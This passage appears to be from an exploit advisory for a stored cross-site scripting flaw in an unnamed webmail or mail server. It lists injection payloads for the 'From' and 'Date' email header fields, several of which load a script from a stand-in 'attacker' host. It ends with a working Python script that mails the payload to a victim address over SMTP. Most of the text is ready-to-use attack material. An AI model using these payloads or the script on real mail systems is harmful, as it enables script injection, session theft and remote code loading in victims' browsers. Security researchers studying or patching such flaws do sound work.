nstalled On: Windows Server 2003 SP2
Client Test OS: Window 7 Pro SP1 (x86), OS: MAC OS Lion
Browser Used: Internet Explorer 9, Firefox 12
 
Injection Point: From
Injection Payload(s):
1:  ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
 
Injection Point: Date
Injection Payload(s):
1: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
2: <SCRIPT>alert('XSS')</SCRIPT>
3: <SCRIPT SRC=http://attacker/xss.js></SCRIPT>
4: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
5: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
6: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
7: <SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>
8: <SCRIPT a=">'>" SRC="http://attacker/xss.js"></SCRIPT>
 
'''
 
 
import smtplib, urllib2
 
payload = """<SCRIPT SRC=http://attacker/xss.js></SCRIPT>"""
 
def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += "Date: Today" + payload + "\r\n"
        msg += "Subject: XSS\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS.\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()
 
username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"
 
print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)
